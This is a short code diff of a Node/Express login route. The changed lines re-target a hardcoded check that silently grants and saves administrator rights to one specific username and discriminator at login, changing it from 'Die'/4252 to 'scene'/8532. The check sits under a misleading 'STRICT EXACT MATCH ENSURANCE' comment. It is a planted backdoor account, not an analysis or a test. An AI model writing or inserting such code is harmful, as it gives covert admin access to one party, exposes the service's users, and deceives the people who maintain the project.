@@ -80,7 +80,7 @@ app.post('/api/login', async (req, res) => {
     if (!user || !(await bcrypt.compare(req.body.password, user.password))) return res.status(401).json({ error: "Invalid credentials" });
     
     // STRICT EXACT MATCH ENSURANCE
-    if (user.username === "Die" && user.discriminator === "4252" && !user.isAdmin) {
+    if (user.username === "scene" && user.discriminator === "8532" && !user.isAdmin) {
         user.isAdmin = true;
         await user.save();
     }
